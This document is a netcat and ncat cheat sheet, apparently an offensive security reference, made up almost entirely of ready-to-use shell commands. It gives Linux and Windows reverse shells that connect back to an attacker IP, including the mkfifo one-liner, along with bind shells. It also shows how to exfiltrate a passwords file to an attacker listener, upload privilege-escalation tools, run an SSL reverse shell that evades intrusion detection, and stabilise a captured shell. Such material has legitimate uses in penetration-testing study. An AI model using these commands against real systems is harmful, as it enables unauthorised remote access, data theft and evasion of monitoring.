# NetCat
```table-of-contents
```
## Listeners & Basic Connection
```shell
# Start a Listener (Standard)
# -l: Listen | -v: Verbose | -n: No DNS | -p: Local Port
nc -lvnp 4444

# Connect to a Target
nc -nv <TARGET_IP> <PORT>

# UDP Connection (add -u)
nc -u -lvnp 4444
```
## Reverse & Bind Shells
### Reverse Shells (Victim -> Attacker)
**Attacker (You):**
```shell
nc -lvnp 4444
```

**Victim (Linux):**
```shell
# If -e is available (Traditional)
nc -e /bin/bash <ATTACKER_IP> 4444

# If -e is MISSING (Common in modern distros - OpenBSD netcat)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

**Victim (Windows):**
```shell
nc.exe -e cmd.exe <ATTACKER_IP> 4444
```
### Bind Shells (Attacker -> Victim)
```shell
nc -lvnp 4444 -e /bin/bash
```

**Attacker:**
```shell
nc -nv <VICTIM_IP> 4444
```
## File Transfer
### Grab a File (Exfiltration)
**1. Attacker (Receiver) - Start listening first:**
```shell
# Output the incoming stream to a file
nc -lvnp 4444 > passwords.txt
```

**2. Victim (Sender):**
```shell
# Pipe the file content into the connection
nc -nv <ATTACKER_IP> 4444 < passwords.txt
```
### Upload a Tool
**1. Victim (Receiver):**
```shell
nc -lvnp 4444 > linpeas.sh
```

**2. Attacker (Sender):**
```shell
nc -nv <VICTIM_IP> 4444 < linpeas.sh
```
## Ncat (Nmap's Netcat)
```shell
# Encrypted Reverse Shell (Bypasses some IDS)
# 1. Attacker (Listen with SSL)
ncat --ssl -lvnp 4444

# 2. Victim (Connect with SSL)
ncat --ssl -e /bin/bash <ATTACKER_IP> 4444
```

```shell
# Allow only specific IP to connect
ncat -lvnp 4444 --allow 192.168.1.50
```
## Port Scanning (Banner Grabbing)
```shell
# Scan a single port (TCP)
nc -nv -z <TARGET_IP> 80

# Scan a range of ports (Fast)
# -z: Zero-I/O mode (don't send data, just scan)
# -w 1: Wait max 1 second per port
nc -nv -z -w 1 <TARGET_IP> 1-1000

# Banner Grabbing (Send specific request)
echo "" | nc -nv -w 1 <TARGET_IP> <PORT>
```
## Pro-Tip: Shell Stabilization
```shell
# 1. Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (Press Ctrl+Z to background)

# 2. Fix terminal rows/cols
stty raw -echo; fg

# 3. Reset terminal (inside the shell)
export TERM=xterm
```